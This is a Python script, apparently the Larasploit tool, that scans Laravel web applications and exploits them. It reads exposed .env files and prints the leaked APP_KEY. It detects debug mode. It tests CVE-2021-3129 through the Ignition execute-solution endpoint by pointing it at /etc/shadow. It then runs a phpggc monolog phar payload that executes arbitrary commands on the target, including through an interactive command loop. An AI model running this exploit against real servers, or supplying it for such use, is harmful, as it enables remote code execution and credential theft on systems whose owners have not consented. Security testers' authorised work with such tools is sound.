#!/usr/bin/env python3

import requests
import sys
import os
import urllib3
import json
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

# Try to import ignition_rce module
try:
    import ignition_rce.main as ig
    IGNITION_RCE_AVAILABLE = True
except ImportError:
    IGNITION_RCE_AVAILABLE = False
    print("Warning: ignition_rce module not found. RCE exploitation will be limited.")

urllib3.disable_warnings()

from bs4 import BeautifulSoup


class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


host = ""
app_key = ""


def banner() -> None:
    """Display the application banner"""
    print(Colors.OKGREEN)
    print(r"""
______                                     ______     __________
___  / ______ _____________ __________________  /________(_)_  /_
__  /  _  __ `/_  ___/  __ `/_  ___/__  __ \_  /_  __ \_  /_  __/
_  /___/ /_/ /_  /   / /_/ /_(__  )__  /_/ /  / / /_/ /  / / /_
/_____/\__,_/ /_/    \__,_/ /____/ _  .___//_/  \____//_/  \__/
                                   /_/
    - Laravel Automated Vulnerability Scanner
    """)
    print(Colors.HEADER)


def fingerprint() -> dict:
    """Fingerprint the Laravel application and detect vulnerabilities"""
    global host, app_key

    fingerprint_data = {}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }

    try:
        response = requests.get(host, headers=headers, verify=False, allow_redirects=True, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f'{Colors.FAIL} [ERR]: {Colors.HEADER} Connection failed: {e}')
        return fingerprint_data

    print(f'{Colors.HEADER}')
    print(f"{Colors.OKGREEN} [~] Application Fingerprint {Colors.HEADER}\n")
    print(f'{Colors.OKGREEN} [HTTP STATUS]: {Colors.HEADER} {response.status_code}')

    if 'Location' in response.headers:
        print(f'{Colors.OKGREEN} [HTTP Redirect]: {Colors.HEADER} {response.headers["Location"]}')

    if 'server' in response.headers and response.headers['Server']:
        fingerprint_data['server'] = response.headers['server']
        print(f'{Colors.OKGREEN} [Server]: {Colors.HEADER} {response.headers["Server"]}')

    if 'X-Powered-By' in response.headers and 'PHP' in response.headers['X-Powered-By']:
        fingerprint_data['php_version'] = response.headers['X-Powered-By']
        print(f'{Colors.OKGREEN} [PHP Version]: {Colors.HEADER} {response.headers["X-Powered-By"]}')

    for cookie in dict(response.cookies):
        if 'XSRF-TOKEN' in cookie or '_session' in cookie:
            fingerprint_data[cookie] = response.cookies[cookie]
            cookie_value = response.cookies[cookie][:20] if len(response.cookies[cookie]) > 20 else response.cookies[cookie]
            print(f'{Colors.OKGREEN} [Common Laravel Cookie]: {Colors.HEADER} {cookie}: {cookie_value}...')

    if '_ignition\\/' in response.text:
        fingerprint_data['laravel_default'] = True
        fingerprint_data['laravel_ignition'] = True
        print(f'{Colors.WARNING} [INFO]: {Colors.HEADER} Laravel 8 detected (with ignition)!')

    if 'Laravel v8' in response.text:
        fingerprint_data['laravel_default'] = True
        print(f'{Colors.WARNING} [INFO]: {Colors.HEADER} Laravel 8 detected!')

    soup = BeautifulSoup(response.text, "html.parser")
    laravel_version = ""

    for search_wrapper in soup.find_all('div', {'class': 'ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0'}):
        laravel_version = search_wrapper.text.strip()

    if laravel_version:
        print(f'{Colors.WARNING} [INFO]: {Colors.HEADER} Default Laravel installation detected!')
        print(f'{Colors.WARNING} [Version]: {Colors.HEADER} {laravel_version}')
        fingerprint_data['laravel_version'] = laravel_version

    laravel_default = False
    for search_wrapper in soup.find_all('div', {'class': 'title m-b-md'}):
        text = search_wrapper.text.strip()
        if text == "Laravel":
            laravel_default = True

    for search_wrapper in soup.find_all('div', {'class': 'links'}):
        link = search_wrapper.find('a')
        if link:
            text = link.text.strip()
            if text in ["Laravel", "Docs"]:
                laravel_default = True

    if laravel_default:
        fingerprint_data['laravel_default'] = True
        print(f'{Colors.WARNING} [INFO]: {Colors.HEADER} Default Laravel installation detected!')
        print(f'{Colors.WARNING} [Version]: {Colors.HEADER} Laravel < 7')

    try:
        env_testing = requests.get(f"{host}/.env", headers=headers, verify=False, timeout=10)
        if env_testing.status_code == 200 and 'APP_ENV' in env_testing.text:
            fingerprint_data['laravel_env'] = True
            print(f"{Colors.FAIL} [VULN] Vulnerability detected: .env file exposed\n")

            for env_line in env_testing.text.split('\n'):
                if env_line.startswith('APP_KEY'):
                    app_key = env_line.split("=")[1] if "=" in env_line else ""
                    print(f'{Colors.WARNING} [INFO]: {Colors.HEADER} APP_KEY leaked: {app_key}')
                if "APP_DEBUG" in env_line:
                    if env_line.strip() == "APP_DEBUG=true":
                        print(f'{Colors.WARNING} [INFO]: {Colors.HEADER} Application running in Debug Mode (got via .env)')
                    else:
                        print(f'{Colors.WARNING} [INFO]: {Colors.HEADER} Application running without Debug Mode')
    except requests.exceptions.RequestException:
        pass

    return fingerprint_data


def check_debug() -> bool:
    """Check if the application is running in debug mode"""
    global host

    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']

    for method in methods:
        try:
            response = requests.request(method, host, verify=False, timeout=10)
            if response.status_code == 405 and 'MethodNotAllowedHttpException' in response.text:
                return True
        except requests.exceptions.RequestException:
            continue

    return False


def check_requirements() -> None:
    """Check if required dependencies are present"""
    missing = []

    if not os.path.isfile('./phpggc/phpggc'):
        missing.append('phpggc')

    if not IGNITION_RCE_AVAILABLE:
        missing.append('ignition_rce module')

    if missing:
        print(f'{Colors.WARNING} [WARN]: {Colors.HEADER} Missing dependencies: {", ".join(missing)}')
        print(f'{Colors.WARNING} [INFO]: {Colors.HEADER} Scanner will work in detection-only mode')
        print(f'{Colors.WARNING} [INFO]: {Colors.HEADER} To enable full exploitation, run:')
        print(f'{Colors.OKCYAN}        git clone https://github.com/ambionics/phpggc.git')
        print(f'{Colors.OKCYAN}        git clone https://github.com/OWASP/Larasploit.git')
        print()
        return False

    return True


def check_ignition() -> bool:
    """Check for Ignition RCE vulnerability (CVE-2021-3129)"""
    global host

    headers = {
        'Content-Type': 'application/json',
        'Accept-Encoding': 'deflate'
    }
    data = json.dumps({
        "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "test",
            "viewFile": "/etc/shadow"
        }
    })

    try:
        response = requests.post(
            f'{host}/_ignition/execute-solution',
            data=data,
            headers=headers,
            verify=False,
            timeout=10
        )
        return 'failed to open stream: Permission denied' in response.text
    except requests.exceptions.RequestException:
        return False


def main() -> None:
    """Main function"""
    global host

    banner()
    has_requirements = check_requirements()

    if len(sys.argv) > 1:
        host = sys.argv[1]
        print(f'{Colors.OKGREEN} [Target]: {Colors.HEADER} {host}')

        fp = fingerprint()

        if 'laravel_env' in fp:
            print(f'{Colors.WARNING} [INFO]: {Colors.HEADER} Brace for attack...')
        else:
            debug = check_debug()
            if debug:
                print(f'{Colors.WARNING} [INFO]: {Colors.HEADER} Application running in Debug Mode (got via HTTP Method not allowed)')

        ignition_vuln = check_ignition()
        if ignition_vuln:
            print(f"{Colors.FAIL} [VULN] Vulnerability detected: Remote Code Execution with CVE-2021-3129")

            if not has_requirements or not IGNITION_RCE_AVAILABLE:
                print(f"{Colors.WARNING} [WARN]: Cannot exploit - missing dependencies")
                print(f"{Colors.WARNING} [INFO]: Install phpggc and ignition_rce to enable exploitation")
                return

            print(f"{Colors.FAIL} [Exploiting] Remote Code Execution with CVE-2021-3129\n")

            if '-i' in sys.argv:
                print(f' [!] Larasploit Interactive session [ON]')
                cmd = 'id'
                while cmd != "exit":
                    os.system(
                        f"php -d 'phar.readonly=0' ./phpggc/phpggc --phar phar -f -o ./exploit.phar monolog/rce1 system '{cmd}'"
                    )
                    ig.main(host, './exploit.phar', None)
                    cmd = input(f'{Colors.HEADER} [iCMD]{Colors.ENDC}$ ')
            else:
                os.system(
                    f"php -d 'phar.readonly=0' ./phpggc/phpggc --phar phar -f -o ./exploit.phar monolog/rce1 system id"
                )
                ig.main(host, './exploit.phar', None)
    else:
        print(f"{Colors.WARNING}[😈] USE: python3 {sys.argv[0]} https://target.com\n")
        print(f"{Colors.WARNING}[😈] USE: python3 {sys.argv[0]} https://target.com -i {Colors.HEADER}(interactive mode)\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[😈] (CTRL + C) Exiting...\n")
    except Exception as e:
        print(f"\n{Colors.FAIL}[ERR] Unexpected error: {e}\n")
        sys.exit(1)
